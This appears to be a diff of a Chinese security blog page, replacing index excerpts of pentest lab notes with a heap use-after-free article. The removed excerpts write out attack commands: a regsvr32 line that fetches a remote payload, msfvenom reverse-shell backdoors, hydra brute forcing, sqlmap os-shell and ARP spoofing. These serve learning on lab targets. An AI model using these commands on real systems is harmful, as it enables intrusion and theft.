@@ -1,10 +1,21 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
-<meta property="og:title" content="PIG-007">
-<meta property="og:url" content="http://pig-007.github.io/index.html">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前言       一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各版本UAF专场">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/index.html">
 <meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="前言       一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为f">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108192133799.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/25/Cz6mwhutfnQXHLG.png">
+<meta property="og:image" content="c:/Users/007/Desktop/Snipaste_2021-08-25_17-50-30.png">
+<meta property="article:published_time" content="2021-08-19T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-25T14:57:15.780Z">
 <meta property="article:author" content="PIG-007">
-<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png"><title>各版本UAF专场 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
 var CONFIG = {
   root: '/',
   algolia: undefined,
@@ -28,7 +39,7 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/%E5%90%84%E7%89%88%E6%9C%ACUAF%E4%B8%93%E5%9C%BA/">各版本UAF专场</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-25</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">各版本UAF专场</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-25</span></span></div></header><div class="post-body">
         <h1 id="前言"   >
           <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
       <p>一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。</p>
@@ -400,292 +411,61 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>当然，UAF其实是特别好利用的一种，高版本下也对应有很多的骚操作，比如</p>
 <p>等等现在大多的题目都是off by null + 堆布局，尤其是堆布局这一块，实在是无比考验对堆的理解，因为万一其中哪个地方想错，直接就得推倒重来。</p>
 <p>后面找时间再总结下off by null吧。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/2.metasploit-%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90/">2.metasploit-部分命令执行获取权限</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、前期运行：web中，当可以输入某些查询框时，该输入会被运行在命令行中，例如ping命令。(DVWA)</p>
-<p>1.web要求输入ip地址，经检查可以发现输入的内容会被完整运行到服务器的命令行下。</p>
-<p>例如输入127.0.0.1 &amp;&amp; whoami，web反馈的信息除了ping 127.0.0.1，还会将whoami这个命令的信息给返回。</p>
-<p>2.在Msfconsle中使用web_delivrery模块use exploit/multi/script/web_delivery，之后设置对应参数：</p>
-<p>(1)设置target，需要目标服务器上有对应脚本语言，使得目标服务器上能够运行我们注入的命令，打不动就代表没有，或者没有写入环境变量等等原因：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png" alt="img"></p>
-<p>这里选择目标语言为Regsvr32</p>
-<p>(2)查看还需要的配置，配置一下：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png" alt="img"></p>
-<p>这里的lhost就是攻击方的ip</p>
-<p>(3)设置攻击载荷，生成注入命令：</p>
-<p>set payload windows/meterpreter/reverse_tcp  (使用windows的meterpreter，建立连接reverse_tcp)</p>
-<p>然后就会生成命令：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png" alt="img"></p>
-<p>这就代表我们需要进行命令注入，在目标服务器上执行：</p>
-<p>regsvr32 /s /n /u /i:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.80.159:8080/IVJqvpIJSzu.sct" >http://192.168.80.159:8080/IVJqvpIJSzu.sct</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> scrobj.dll</p>
-<p>此时msfconsole就会进入停滞状态，一旦检查到有目标服务器运行了上述命令，就会生成meterpreter连接。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png" alt="img"></p>
-<p>打不通可能是防火墙或者杀毒软件之类的关系</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/1.metasploit-win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17_010%E5%A4%8D%E7%8E%B0/">1.metasploit-win7永恒之蓝-ms17_010复现</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>开了防火墙的话可能都ping不通，需要各种绕过</p>
-<p>一、前期工作：</p>
-<p>1.首先信息收集，获取真实IP，然后扫描，很多种，参数太多：</p>
-<p>nmap -O -p445 ip：检查是否开启445端口及主机操作系统</p>
-<p>db_nmap -sT -T4 ip：快速扫描，db是database</p>
-<p>2.然后看有没有漏洞，需要对漏洞有一定掌握</p>
-<p>3.在metasploit下查找漏洞的使用模块和扫描模块等，下面利用win7的永恒之蓝漏洞：</p>
-<p>search ms17_011：查找该漏洞的相关</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510199.png" alt="img"></p>
-<p>4.先使用该模块扫描看看有没有该漏洞：</p>
-<p>(1)进入模块并且配置模块信息：</p>
-<p>use auxiliary/scanner/smb/smb_ms17_010</p>
-<p>show options</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509941.png" alt="img"></p>
-<p>set RHOSTS ip</p>
-<p>(2)使用该模块来扫描：</p>
-<p>run或者exploit</p>
-<p>检测到可能有，那么使用攻击模块：</p>
-<p>5.使用攻击模块进行攻击：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509097.png" alt="img"></p>
-<p>set RHOSTS ip</p>
-<p>exploit</p>
-<p>6.得到目的主机的shell：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509506.png" alt="img"></p>
-<p>7.为了不乱码，设置编码格式为utf-8：</p>
-<p>chcp 65001</p>
-<p>8.调换至后台，输入sessions可以查看，sessions id可以进入：</p>
-<p>background</p>
-<p>sessions</p>
-<p>sessions id</p>
-<p>9.为了更好利用，调换至meterpreter模式：</p>
-<p>sessions -u 1</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509822.png" alt="img"></p>
-<p>二、生成后门程序传到在目标机器上，这样下回目标机器运行该程序，主机监听到之后就可以直接进入了，不管漏洞在不在。</p>
-<p>1.生成后门程序：</p>
-<p>①msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f exe &gt; localmsf8881.exe</p>
-<p>②msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw &gt; localmsf8881.py</p>
-<p>③msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw &gt; localmsf8881.php</p>
-<p>可以生成很多种后门程序，只要在目标机器上运行，那么就可以利用</p>
-<p>2.本机上使用模块，设置payload和监听端口：</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.80.158</p>
-<p>set LPORT 8881</p>
-<p>run</p>
-<p>3.现在如果靶机上运行localmsf8881，就会传回信息给主机，主机上的这个命令行就会得到一个meterpreter的session，之后就可以进入了</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png" alt="img"></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/3.%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95/">3.弱口令密码破解登录</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.制作字典：</p>
-<p>(1)利用cewl制作：</p>
-<p>cewl -d 2 -m 5 -w word.txt <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.baidu.com/" >www.baidu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>(d:deepth，爬取层数</p>
-<p>m:….性能，设置越大爬取越快)</p>
-<p>(2)利用工具制作：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.bugku.com/mima/" >http://www.bugku.com/mima/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 输入相应信息即可生成</p>
-<p>(3)利用github上的工具：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts" >https://github.com/TheKingOfDuck/fuzzDicts</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb" >https://github.com/fuzzdb-project/fuzzdb</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>▲生成的字典可能有中文，使用%s/\v[^\x00-\xff]+//g来强制删除中文[^\x00-\xff]即中文的表示，双字节字符</p>
-<p>2.利用字典爆破SSH/RDP:</p>
-<p>(1)先扫描是否开启了ssh端口：</p>
-<p>nmap -sT -T4 ip：快速扫描</p>
-<p>(1)使用hydra:</p>
-<p>参数设置:</p>
-<p>-l(Login)：想要破解的用户，例如root</p>
-<p>-L(FILE)：指定用户名字典</p>
-<p>-p(pass)：指定密码，如果有密码还爆破干啥</p>
-<p>-P(FILE)：指定密码字典</p>
-<p>-s(PORT)：指定爆破端口</p>
-<p>-M(FILE)：指定目标列表文件，如果有多个IP目标需要攻击，可用来指定</p>
-<p>-C(FILE)：</p>
-<p>-f ：使用-M参数后，找到第一登录名和密码即终止</p>
-<p>▲hydra -l root -p root 127.0.0.1 -s 2222 ssh -f：用root密码登录root通过ssh</p>
-<p>▲hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh</p>
-<p>▲hydra -l administrator -P word.txt 127.0.0.1 rdp(类似windows下的ssh)</p>
-<p>★可以使用kali自带的密码字典尝试：</p>
-<p>目录在/usr/share/wordlists/metasploit/下，有很多字典密码</p>
-<p>(2)使用msf攻击</p>
-<p>①搜索一下：search login //login等等</p>
-<p>②通过查找到的使用该模块：use auxiliary/scanner/ssh/ssh_login</p>
-<p>③show options看一下需要设置什么信息，设置ip，用户名，密码字典，端口，爆破线程数量等信息，然后直接run即可。</p>
-<p>set RHOST/USERNAME/PASS_FILE/RPORT/THREADS等等</p>
-<p>3.Burp(burpsuite)爆破后台密码：(还没学)</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/4.SQL%E6%B3%A8%E5%85%A5/">4.SQL注入</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、SQL注入：</p>
-<p>1.常用命令：</p>
-<p>2.SQLMAP使用：</p>
-<p>(1)前置了解：</p>
-<p>官方网址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://sqlmap.org/" >http://sqlmap.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>Github网址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap" >https://github.com/sqlmapproject/sqlmap</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md" >https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>使用手册：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" >https://github.com/sqlmapproject/sqlmap/wiki/Usage</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>(2)常用类型：</p>
-<p>▲基于布尔的盲注：GET型</p>
-<p>攻击流程：</p>
-<p>①测试目标是否存在sql注入：sqlmap -u ip</p>
-<p>这里就可能会返回payload，可以用来自定义使用</p>
-<p>②之后查找所有database：sqlmap -u ip –dbs</p>
-<p>③查找所有tables：sqlmap -u ip –tables</p>
-<p>④查找存储的属性字段：sqlmap -u ip -D database_name -T table_name –columns</p>
-<p>⑤依据属性字段查找想要的数据：sqlmap -u ip -D database_name -T table_name -C column_1,column_2… –dump</p>
-<p>(例如table中可能就保存id,username,password的属性，就可以查找账号密码出来)</p>
-<p>▲针对登录框的SQL注入：POST型</p>
-<p>①利用burpsuite抓请求登录的包，查看(需要先设置代理，然后拦截，8080可能不行，得其它端口代理)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191504869.png" alt="img"></p>
-<p>username=admin&amp;password=admin&amp;authorization=</p>
-<p>最下面的这个基本就是我们传输的请求登录信息。</p>
-<p>②然后将这些内容保存下来，生成一个文件sql.txt，将这个文件用sqlmap运行分析：</p>
-<p>sqlmap -r sql.txt</p>
-<p>这样就开始从sql.txt文件中分析了，判断到底有没有sql注入漏洞，有的话就应该有对应的payload生成出来。</p>
-<p>▲之后就类似上面的，获取数据库，table等等信息，从而最终获取服务器的登录账号和密码。</p>
-<p>▲其它类型的测试：测试共5级</p>
-<p>测试注入时加上参数–level=LEVEL</p>
-<p>①默认：GET和POST测试</p>
-<p>②2级：测试cookie：</p>
-<p>(看服务器会不会根据cookie来获取用户数据)</p>
-<p>sqlmap -r sql.txt –level=2</p>
-<p>②3级：测试HTTP User-Agent/Referer头的值</p>
-<p>3.SQL-Shell：</p>
-<p>(1)通过漏洞进入SQL-Shell：</p>
-<p>sqlmap -r sql.txt –level=5 –sql-shell</p>
-<p>这样如果能进入就可以直接用SQL语句来查询数据</p>
-<p>(2)通过漏洞进入OS-shell：</p>
-<p>sqlmap -r sql.txt –level=5 –os-shell</p>
-<p>①之后需要选择Web站点的搭建语言，通过插件或者其它形式判断(php,jsp等等)</p>
-<p>②然后需要输入一个可以往里面写东西的文件目录：例如/var/www/upload</p>
-<p>这里目录可以通过工具来查找：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">git clone https://github.com/maurosoria/dirsearch</span><br><span class="line">cd dirsearch</span><br><span class="line">python3 dirsearch.py -u ip</span><br></pre></td></tr></table></div></figure>
-
-<p>这样sqlmap就可以上传东西，写入一些类似于web-shell等东西，从而获取权限。</p>
-<p>③那么就进入os-shell了，可以获取到服务器权限</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/6.ARP%E6%AC%BA%E9%AA%97/">arp欺骗</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.首先查看和自己同属一个网段下的ip：</p>
-<p>nbtscan -r 192.168.80.167/24</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png" alt="img"></p>
-<p>这里157即为目标ip，167即为本机攻击ip</p>
-<p>(这个需要apt-get install nbtscan)</p>
-<p>2.然后使用工具arpspoof进行欺骗，kalilinux自带：</p>
-<p>(1)arpspoof -i eth0 -t 192.168.80.157 192.168.80.2</p>
-<p>(eth0是网卡接口，-t后是目标ip，之后的ip是该网段下的默认路由ip，可以通过route -n查询，或者其它方式)</p>
-<p>▲这个原理就是修改己方的Mac地址为默认路由的Mac地址，那么目标主机发出的MAC帧就会被己方接收。</p>
-<p>(2)如果攻击机开启了Ipv4的路由转发功能，那么arp欺骗不会成功，因为到达攻击机的包被转发出去了。</p>
-<p>①查看己方的路由转发功能是否开启：</p>
-<p>cat /proc/sys/net/ipv4/ip_forward</p>
-<p>为0则关闭，为1则开启了。</p>
-<p>②修改路由转发功能：</p>
-<p>echo “0” &gt; /proc/sys/net/ipv4/ip_forward</p>
-<p>这行命令是往该文件中写入0，关闭路由转发功能</p>
-<p>sysctl -p(让服务即可生效)</p>
-<p>▲另外永久开启服务的相关命令可以上网再查</p>
-<p>3.查看自己是否被ARP欺骗攻击：arp -a</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503844.png" alt="img"></p>
-<p>可以看到在目标机器上在没有被攻击之前，默认路由ip对应的mac地址和攻击机ip对应的mac地址是不一样的，但是被攻击之后却变成一样的了。</p>
-<p>▲解决办法：</p>
-<p>(1)将dns服务器ip和mac静态绑定:</p>
-<p>arp -s [dns_ip] [dns_mac]</p>
-<p>(2)如果不知道原来的dns服务器的mac地址，那么可以先arp -d清空一下arp缓存，然后arp -a查看，这时候原本的dns服务器就会发过来包，其MAC就能被看到。</p>
-<p>(3)如果攻击者一直执行欺骗程序，开启系统防火墙后清空arp缓存，也能抵御一般的arp欺骗。</p>
-<p>(4)如果防火墙还是抵御不了，或者不允许开启防火墙，那么就进行抓包，先将arp缓存清空，之后抓取dns服务器发过来的包，其MAC一定正确，将该MAC地址与dns服务器ip绑定。(没有抓包工具就重复清空缓存，查询，大不了整个bat批处理，一定会有攻击者攻击间隙使得dns服务器发过来的包被解析，然后再绑定)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503433.png" alt="img"></p>
-<p>(5)如果攻击者充当中间人，截取dns发给受害者的服务包…那再说，估计只能破密了。</p>
-<p>▲可以事先将DNS的MAC定期备份，定期删除。</p>
-<p>4.开启目标机网络功能，截取目标机的数据包：</p>
-<p>▲使用的工具在不同协议和不同环境的抓取能力都不太一样</p>
-<p>(1)使用DSniff，支持Telnet 、Ftp、Smtp、P0P3、HTTP，以及其它的一些高层网络应用协议，用Telnet比较好用。比较老了，很多杀毒软件或者防火墙安全措施什么的都可以发现。</p>
-<p>dsniff -i eth0(有时候不太好用)</p>
-<p>(2)使用Ettercap<br>ettercap -Tq -i eth0(Tq是参数用的，过滤掉不必要的包)</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/5.%E5%88%A9%E7%94%A8Cobaltstrike%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90/">5.利用Cobaltstrike获取权限</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、攻击weblogic(端口基于7001)：</p>
-<p>▲前置环境部署：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd  vulhub/</span><br><span class="line">cd  weblogic/</span><br><span class="line">cd CVE-......(选择一种漏洞)</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure>
-
-<p>这样就搭建了好了该漏洞的环境，使用docker ps -a可以看到端口映射到本地，所以在本地输入127.0.0.1:7001即可看到对应的weblogic服务。</p>
-<p>输入127.0.0.1:7001/console可以进入到服务界面</p>
-<p>1.利用WeblogicScan先扫描看看有没有weblogic的漏洞:</p>
